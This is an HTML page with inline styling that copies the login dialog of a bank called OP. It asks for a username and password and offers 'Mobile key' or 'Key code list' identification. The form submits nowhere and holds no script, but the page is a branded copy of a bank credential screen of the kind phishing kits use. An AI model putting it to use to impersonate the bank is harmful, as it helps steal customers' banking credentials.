<!DOCTYPE html>
<html lang="fi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OP - Log in</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
            width: 100%;
            max-width: 450px;
            padding: 0;
            position: relative;
            overflow: hidden;
        }

        .login-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px 28px;
            border-bottom: 1px solid #e5e7eb;
        }

        .login-title {
            font-size: 24px;
            font-weight: 600;
            color: #111827;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #f3f4f6;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }

        .close-btn:hover {
            background: #e5e7eb;
        }

        .close-btn svg {
            width: 18px;
            height: 18px;
            stroke: #6b7280;
        }

        .login-content {
            padding: 28px;
        }

        .identification-section {
            margin-bottom: 28px;
        }

        .section-label {
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 12px;
            display: block;
        }

        .radio-group {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .radio-option {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
        }

        .radio-input {
            width: 20px;
            height: 20px;
            border: 2px solid #d1d5db;
            border-radius: 50%;
            position: relative;
            flex-shrink: 0;
            transition: all 0.2s;
        }

        .radio-input input {
            position: absolute;
            opacity: 0;
            cursor: pointer;
        }

        .radio-input input:checked + .radio-dot {
            display: block;
        }

        .radio-dot {
            display: none;
            width: 10px;
            height: 10px;
            background: #ff6b35;
            border-radius: 50%;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }

        .radio-option input:checked ~ .radio-label {
            color: #111827;
            font-weight: 500;
        }

        .radio-label {
            font-size: 15px;
            color: #6b7280;
            transition: all 0.2s;
        }

        .help-icon {
            width: 18px;
            height: 18px;
            color: #9ca3af;
            cursor: help;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
            background: white;
        }

        .form-input:focus {
            outline: none;
            border-color: #ff6b35;
            box-shadow: 0 0 0 3px rgba(255, 107, 53, 0.1);
        }

        .form-input::placeholder {
            color: #9ca3af;
        }

        .forgot-link {
            display: inline-block;
            margin-top: 8px;
            font-size: 14px;
            color: #ff6b35;
            text-decoration: none;
            transition: color 0.2s;
        }

        .forgot-link:hover {
            color: #e55a2b;
            text-decoration: underline;
        }

        .continue-btn {
            width: 100%;
            padding: 14px;
            background: #ff6b35;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
        }

        .continue-btn:hover {
            background: #e55a2b;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
        }

        .continue-btn:active {
            transform: translateY(0);
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #9ca3af;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e5e7eb;
        }

        .divider span {
            padding: 0 16px;
        }

        .other-bank-btn {
            width: 100%;
            padding: 14px;
            background: #f9fafb;
            color: #374151;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .other-bank-btn:hover {
            background: #f3f4f6;
            border-color: #d1d5db;
        }

        .arrow-icon {
            width: 20px;
            height: 20px;
            color: #ff6b35;
        }

        @media (max-width: 480px) {
            .login-container {
                max-width: 100%;
                border-radius: 12px;
            }

            .login-header {
                padding: 20px;
            }

            .login-content {
                padding: 24px 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2 class="login-title">Log in</h2>
            <button class="close-btn" onclick="window.close()">
                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
            </button>
        </div>

        <div class="login-content">
            <form id="opLoginForm">
                <div class="identification-section">
                    <label class="section-label">Identification method</label>
                    <div class="radio-group">
                        <label class="radio-option">
                            <div class="radio-input">
                                <input type="radio" name="identification" value="mobile" id="mobile-key">
                                <span class="radio-dot"></span>
                            </div>
                            <span class="radio-label">Mobile key</span>
                            <svg class="help-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.228 9c.549-1.165 2.03-2 3.772-2 2.21 0 4 1.343 4 3 0 1.4-1.278 2.575-3.006 2.907-.542.104-.994.54-.994 1.093m0 3h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                            </svg>
                        </label>
                        <label class="radio-option">
                            <div class="radio-input">
                                <input type="radio" name="identification" value="keycode" id="key-code" checked>
                                <span class="radio-dot"></span>
                            </div>
                            <span class="radio-label">Key code list</span>
                        </label>
                    </div>
                </div>

                <div class="form-group">
                    <label for="username" class="form-label">Username</label>
                    <input 
                        type="text" 
                        id="username" 
                        name="username" 
                        class="form-input" 
                        placeholder="Enter your OP username"
                        required
                        autocomplete="username"
                    >
                </div>

                <div class="form-group">
                    <label for="password" class="form-label">Password</label>
                    <input 
                        type="password" 
                        id="password" 
                        name="password" 
                        class="form-input" 
                        placeholder="Enter your OP password"
                        required
                        autocomplete="current-password"
                    >
                    <a href="#" class="forgot-link">Forgot your username?</a>
                </div>

                <button type="submit" class="continue-btn">Continue</button>
            </form>

            <div class="divider">
                <span>OR</span>
            </div>

            <button type="button" class="other-bank-btn">
                <span>Log in with another bank's ID</span>
                <svg class="arrow-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path>
                </svg>
            </button>
        </div>
    </div>
</body>
</html>
